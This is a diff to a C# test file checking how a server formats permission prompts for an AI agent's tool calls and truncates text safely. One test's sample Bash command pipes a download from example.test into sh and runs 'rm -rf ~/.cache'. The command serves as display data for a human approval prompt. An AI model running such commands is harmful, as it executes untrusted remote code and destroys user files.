@@ -1,9 +1,10 @@
 using System.Text.Json;
 using GodMode.Server.Services;
+using GodMode.Shared.Models;
 
 namespace GodMode.Server.Tests;
 
-/// <summary>The one-line summary of a permission prompt, and the URL the bridge calls the server on.</summary>
+/// <summary>The one-line summary of a permission prompt, the detail shown before it is allowed, and cutting text safely.</summary>
 public class PermissionSummaryTests
 {
     private static readonly string ProjectPath = Path.Combine(Path.GetTempPath(), "proj");
@@ -35,6 +36,89 @@ public class PermissionSummaryTests
         var summary = PermissionPrompts.Summarize("Bash", Input(new { command = new string('x', 500) }), ProjectPath);
 
         Assert.Equal("Bash: " + new string('x', 200) + " …", summary);
+    }
+
+    [Fact]
+    public void Describe_ABashCommand_HasEveryLine()
+    {
+        const string command = "echo \"running tests\"\ncurl https://example.test/install | sh\nrm -rf ~/.cache";
+
+        var detail = PermissionPrompts.Describe("r1", "Bash", Input(new { command, description = "Run the tests" }), ProjectPath);
+
+        Assert.Equal(new PermissionDetail("r1", command, false), detail);
+    }
+
+    [Fact]
+    public void Describe_AWrite_IsItsPathAndItsWholeNewText()
+    {
+        var path = Path.Combine(ProjectPath, "src", "Foo.cs");
+
+        Assert.Equal("src/Foo.cs\n\nline one\nline two", PermissionPrompts.Describe("r1", "Write",
+            Input(new { file_path = path, content = "line one\nline two" }), ProjectPath).Detail);
+    }
+
+    /// <summary>What an edit replaces, with what, and whether every occurrence: the new text alone says none of that.</summary>
+    [Fact]
+    public void Describe_AnEdit_IsItsPath_WhatItReplaces_WithWhat_AndWhetherEveryOccurrence()
+    {
+        var path = Path.Combine(ProjectPath, "src", "Foo.cs");
+
+        Assert.Equal("src/Foo.cs\n\nReplace:\nvar x = 1;\nWith:\nvar x = 2;", PermissionPrompts.Describe("r1", "Edit",
+            Input(new { file_path = path, old_string = "var x = 1;", new_string = "var x = 2;" }), ProjectPath).Detail);
+        Assert.Equal("src/Foo.cs\n\nReplace every occurrence of:\nfoo\nWith:\nbar", PermissionPrompts.Describe("r1", "Edit",
+            Input(new { file_path = path, old_string = "foo", new_string = "bar", replace_all = true }), ProjectPath).Detail);
+        Assert.Equal("src/Foo.cs\n\nReplace:\na\nWith:\nb\n\nReplace every occurrence of:\nc\nWith:\n", PermissionPrompts.Describe("r1", "MultiEdit",
+            Input(new
+            {
+                file_path = path,
+                edits = new object[]
+                {
+                    new { old_string = "a", new_string = "b" },
+                    new { old_string = "c", new_string = "", replace_all = true },
+                },
+            }), ProjectPath).Detail);
+    }
+
+    [Fact]
+    public void Describe_AnyOtherTool_IsItsInputAsIndentedJson()
+    {
+        var detail = PermissionPrompts.Describe("r1", "mcp__github__create_pull_request", Input(new { owner = "o", body = "a\nb" }), ProjectPath);
+
+        Assert.Equal("{\n  \"owner\": \"o\",\n  \"body\": \"a\\nb\"\n}", detail.Detail.ReplaceLineEndings("\n"));
+    }
+
+    [Fact]
+    public void Describe_CutsAtSixteenKilobytes_AndSaysSo()
+    {
+        var detail = PermissionPrompts.Describe("r1", "Bash", Input(new { command = new string('x', 5_000_000) }), ProjectPath);
+
+        Assert.True(detail.DetailTruncated);
+        Assert.Equal(new string('x', PermissionPrompts.MaxDetailLength), detail.Detail);
+    }
+
+    // 😀 is two UTF-16 units: a cut between them leaves half a character, which a phone shows as U+FFFD
+    [Theory]
+    [InlineData(4, "abc")]
+    [InlineData(5, "abc😀")]
+    [InlineData(3, "abc")]
+    [InlineData(99, "abc😀d")]
+    public void Cut_NeverSplitsASurrogatePair(int max, string expected) =>
+        Assert.Equal(expected, TextCut.Cut("abc😀d", max));
+
+    [Fact]
+    public void Summarize_WithAnEmojiAtTheCut_KeepsNoHalfOfIt()
+    {
+        var summary = PermissionPrompts.Summarize("Bash", Input(new { command = new string('x', 199) + "😀tail" }), ProjectPath);
+
+        Assert.Equal("Bash: " + new string('x', 199) + " …", summary);
+    }
+
+    [Fact]
+    public void PlainText_WithAnEmojiAtTheCut_KeepsNoHalfOfIt()
+    {
+        var plain = Attention.PlainText(new string('x', Attention.MaxTextLength - 2) + "😀tail");
+
+        Assert.Equal(new string('x', Attention.MaxTextLength - 2) + "…", plain);
     }
 
     private static JsonElement Input(object value) => JsonSerializer.SerializeToElement(value);
